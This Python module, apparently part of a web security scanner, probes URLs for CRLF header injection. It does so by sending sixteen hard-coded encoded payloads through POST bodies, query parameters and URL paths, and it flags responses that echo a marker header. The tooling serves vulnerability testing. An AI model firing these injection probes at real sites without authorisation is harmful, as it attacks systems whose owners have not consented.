"""
Author: Ayush Bhandari
Email: ayushbhandariofficial@gmail.com
"""
import requests
import urllib.parse

# Hardcoded CRLF payloads
CRLF_PAYLOADS = [
    "%0aCRLF-Test: crlf=injection",
    "%0d%0aCRLF-Test: crlf=injection",
    "%0dCRLF-Test: crlf=injection",
    "%23%0aCRLF-Test: crlf=injection",
    "%23%0d%0aCRLF-Test: crlf=injection",
    "%23%0dCRLF-Test: crlf=injection",
    "%25%30%61CRLF-Test: crlf=injection",
    "%25%30aCRLF-Test: crlf=injection",
    "%250aCRLF-Test: crlf=injection",
    "%25250aCRLF-Test: crlf=injection",
    "%2e%2e%2f%0d%0aCRLF-Test: crlf=injection",
    "%2f%2e%2e%0d%0aCRLF-Test: crlf=injection",
    "%2F..%0d%0aCRLF-Test: crlf=injection",
    "%3f%0d%0aCRLF-Test: crlf=injection",
    "%3f%0dCRLF-Test: crlf=injection",
    "%u000aCRLF-Test: crlf=injection",
]

def crlf_post_method(uri, headers, body):
    temp_body = {}
    for key, value in body.items():
        for payload in CRLF_PAYLOADS:
            temp_body.update(body)
            temp_body[key] = payload
            response = requests.post(uri, headers=headers, data=temp_body)
            if any("CRLF-Test" in name for name in response.headers):
                attack_result = {
                    "alert": "CRLF injection",
                    "severity": "High",
                    "url": uri,
                    "req_headers": headers,
                    "req_body": temp_body,
                    "res_headers": response.headers,
                    "res_body": response.text
                }
                print(f"[+] {uri} is vulnerable to CRLF injection")
                return attack_result


def crlf_get_uri_method(uri, headers):
    url_query = urllib.parse.urlparse(uri)
    parsed_query = urllib.parse.parse_qs(url_query.query)
    for key, value in parsed_query.items():
        for payload in CRLF_PAYLOADS:
            par_key = parsed_query.copy()
            par_key[key] = payload
            parsed_uri = urllib.parse.urlunparse(
                (url_query.scheme, url_query.netloc, url_query.path, None, urllib.parse.urlencode(par_key), None)
            )
            response = requests.get(parsed_uri, headers=headers)
            if any("CRLF-Test" in name for name in response.headers):
                attack_result = {
                    "alert": "CRLF injection",
                    "severity": "High",
                    "url": parsed_uri,
                    "req_headers": headers,
                    "req_body": "NA",
                    "res_headers": response.headers,
                    "res_body": response.text
                }
                print(f"[+] {parsed_uri} is vulnerable to CRLF injection")
                return attack_result


def crlf_get_url_method(uri, headers):
    for payload in CRLF_PAYLOADS:
        parsed_uri = urllib.parse.urljoin(uri, payload)
        response = requests.get(parsed_uri, headers=headers)
        if any("CRLF-Test" in name for name in response.headers):
            attack_result = {
                "alert": "CRLF injection",
                "severity": "High",
                "url": parsed_uri,
                "req_headers": headers,
                "req_body": "NA",
                "res_headers": response.headers,
                "res_body": response.text
            }
            print(f"[+] {parsed_uri} is vulnerable to CRLF injection")
            return attack_result


def crlf_check(uri, method, headers, body=None):
    results = []
    if method in ['GET', 'DELETE']:
        result = crlf_get_uri_method(uri, headers)
        if result:
            results.append(result)
        result = crlf_get_url_method(uri, headers)
        if result:
            results.append(result)

    if method in ['POST', 'PUT']:
        result = crlf_post_method(uri, headers, body)
        if result:
            results.append(result)

    if not results:
        return {"result": "No vulnerabilities found"}
    return results

# Example usage:
# results = crlf_check('http://example.com/api', 'POST', {'Authorization': 'Bearer token'}, {'key': 'value'})
# print(results)
